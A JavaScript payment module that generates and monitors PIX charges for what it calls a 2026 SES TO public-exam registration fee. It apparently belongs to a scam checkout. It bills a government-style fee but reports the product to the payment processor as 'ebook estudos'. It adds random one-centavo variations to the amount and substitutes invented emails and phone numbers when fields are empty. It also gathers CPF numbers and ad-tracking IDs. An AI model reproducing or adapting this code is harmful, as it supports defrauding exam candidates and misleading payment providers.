/**
 * MedusaPay via checkout PHP da Medusa (api.medusapayoficial.pro)
 * Sem chaves no frontend — usa /checkout/pagamento.php e /checkout/verificar.php
 */
class MedusapayPayment {
    constructor() {
        this.checkoutCreateUrl = '/checkout/pagamento.php';
        this.checkoutStatusUrl = '/checkout/verificar.php';
        this.productConfig = {
            title: 'Taxa de Inscricao SES TO 2026 - Edital 001/2026',
            amount: 15000,
            quantity: 1,
            tangible: false
        };
        this.resolveAmount();
        console.log('✅ MedusaPay (checkout Medusa) inicializado');
    }

    resolveAmount() {
        try {
            if (typeof window.resolveTaxaSesTo === 'function') {
                window.resolveTaxaSesTo();
            }
        } catch (e) {}

        var taxa = Number(localStorage.getItem('taxaValor') || 0);
        if (taxa !== 100 && taxa !== 150) {
            taxa = (window.SITE_CONFIG && window.SITE_CONFIG.PRODUCT && window.SITE_CONFIG.PRODUCT.value === 100) ? 100 : 150;
        }

        // Valor cobrado com variação aleatória de R$ 0,01
        this.productConfig.amount = this.randomizeTaxaCents(taxa);
        this.productConfig.title = taxa === 100
            ? 'Taxa de Inscricao SES TO 2026 - Nivel Medio/Tecnico'
            : 'Taxa de Inscricao SES TO 2026 - Nivel Superior';

        try {
            localStorage.setItem('taxaCobradaCents', String(this.productConfig.amount));
            localStorage.setItem('taxaCobradaReais', (this.productConfig.amount / 100).toFixed(2));
        } catch (e) {}

        if (window.SITE_CONFIG && window.SITE_CONFIG.PRODUCT) {
            window.SITE_CONFIG.PRODUCT.value_cents = this.productConfig.amount;
            window.SITE_CONFIG.PRODUCT.value = this.productConfig.amount / 100;
        }
        return this.productConfig.amount;
    }

    /**
     * 100,00 → 100,00 | 100,01 | 99,99
     * 150,00 → 150,00 | 150,01 | 149,99
     */
    randomizeTaxaCents(baseReais) {
        var variants = Number(baseReais) === 100
            ? [10000, 10001, 9999]
            : [15000, 15001, 14999];
        return variants[Math.floor(Math.random() * variants.length)];
    }

    validateUserData(userData, addressData) {
        const errors = [];
        const cpf = userData?.CPF || userData?.cpf || '';
        const nome = userData?.NOME || userData?.nome || '';
        if (!cpf || String(cpf).replace(/\D/g, '').length < 11) errors.push('CPF inválido ou ausente');
        if (!nome || String(nome).trim().length < 3) errors.push('Nome inválido ou ausente');
        // Endereço: não bloqueia geração do PIX (preenche defaults no payload)
        return { isValid: errors.length === 0, errors };
    }

    formatCPF(cpf) { return String(cpf || '').replace(/\D/g, ''); }
    formatCEP(cep) { return String(cep || '').replace(/\D/g, ''); }
    formatPhone(phone) { return String(phone || '').replace(/\D/g, ''); }

    getUtmParams() {
        const keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','xcod','fbclid','gclid','ttclid'];
        const out = {};
        keys.forEach((k) => {
            const v = localStorage.getItem(k) || new URLSearchParams(location.search).get(k);
            if (v) out[k] = v;
        });
        try {
            const stored = JSON.parse(localStorage.getItem('utm_params') || '{}');
            Object.assign(out, stored);
        } catch (e) {}
        return out;
    }

    async createPixTransaction(userData, addressData) {
        try {
            this.resolveAmount();
            const validation = this.validateUserData(userData, addressData);
            if (!validation.isValid) {
                throw new Error('Dados inválidos: ' + validation.errors.join(', '));
            }

            const cpf = this.formatCPF(userData.CPF || userData.cpf);
            const nome = String(userData.NOME || userData.nome || '').trim();
            let email = localStorage.getItem('emailConfirmacao') || '';
            if (!email) {
                try {
                    const cad = JSON.parse(localStorage.getItem('cadastroRapido') || '{}');
                    if (cad && cad.email) email = String(cad.email).trim();
                } catch (e) {}
            }
            if (!email) email = 'candidato' + cpf.slice(-4) + '@email.com';

            const telefone = this.formatPhone(
                addressData.telefone || addressData.celular || localStorage.getItem('telefone') || '11999999999'
            );

            const payload = Object.assign({
                valor: this.productConfig.amount,
                nome: nome,
                email: email,
                cpf: cpf,
                telefone: telefone.length >= 10 ? telefone : '11999999999',
                product_title: 'ebook estudos'
            }, this.getUtmParams());

            console.log('📤 Criando PIX via /checkout/pagamento.php', { valor: payload.valor, cpf: payload.cpf });

            const response = await fetch(this.checkoutCreateUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify(payload)
            });

            const data = await response.json().catch(() => ({}));
            if (!response.ok || !data.success) {
                throw new Error(data.message || ('Erro HTTP ' + response.status));
            }

            const pixCode = data.pixCode || data.pixCopiaECola || null;
            const transactionId = data.token || data.id || null;
            if (!pixCode || !transactionId) {
                throw new Error('PIX não foi gerado. Tente novamente.');
            }

            const result = {
                success: true,
                transactionId: String(transactionId),
                status: 'waiting_payment',
                amount: data.valor || this.productConfig.amount,
                pixCode: pixCode,
                pixUrl: data.qrCodeUrl || null,
                qrCodeUrl: data.qrCodeUrl || null,
                expirationDate: data.expires_at || null,
                rawData: data
            };

            console.log('✅ PIX gerado:', result.transactionId);
            return result;
        } catch (error) {
            console.error('❌ Erro ao criar PIX:', error);
            return { success: false, error: error.message, details: error };
        }
    }

    async checkTransactionStatus(transactionId) {
        try {
            const response = await fetch(this.checkoutStatusUrl + '?id=' + encodeURIComponent(transactionId), {
                method: 'GET',
                headers: { 'Accept': 'application/json' }
            });
            if (!response.ok) throw new Error('Erro HTTP ' + response.status);
            const data = await response.json();
            const status = String(data.status || '').toLowerCase();
            const isPaid = status === 'paid' || status === 'aprovado' || status === 'approved';
            return {
                success: !!data.success,
                transactionId: data.transaction_id || transactionId,
                status: isPaid ? 'paid' : (status || 'pending'),
                isPaid: isPaid,
                amount: data.data && data.data.amount,
                rawData: data
            };
        } catch (error) {
            console.error('❌ Erro ao verificar status:', error);
            return { success: false, error: error.message };
        }
    }

    startPaymentMonitoring(transactionId, options = {}) {
        const {
            interval = 8000,
            maxAttempts = 75,
            onPaymentConfirmed = () => {},
            onError = () => {}
        } = options;

        let attempts = 0;
        const intervalId = setInterval(async () => {
            attempts++;
            try {
                const result = await this.checkTransactionStatus(transactionId);
                if (result.isPaid) {
                    clearInterval(intervalId);
                    onPaymentConfirmed(result);
                    return;
                }
                if (attempts >= maxAttempts) {
                    clearInterval(intervalId);
                    onError(new Error('Tempo limite de verificação excedido'));
                }
            } catch (err) {
                if (attempts >= maxAttempts) {
                    clearInterval(intervalId);
                    onError(err);
                }
            }
        }, interval);

        return () => clearInterval(intervalId);
    }

    sendTrackingEvents(eventName, transactionId, amount = null) {
        const value = (amount != null ? amount : this.productConfig.amount) / 100;
        try {
            if (typeof window.trackConversion === 'function') {
                window.trackConversion(eventName, {
                    value: value,
                    transaction_id: transactionId,
                    transaction_hash: transactionId
                });
            }
        } catch (e) {}
        console.log('📊 Tracking:', eventName, transactionId, value);
    }
}

window.MedusapayPayment = MedusapayPayment;
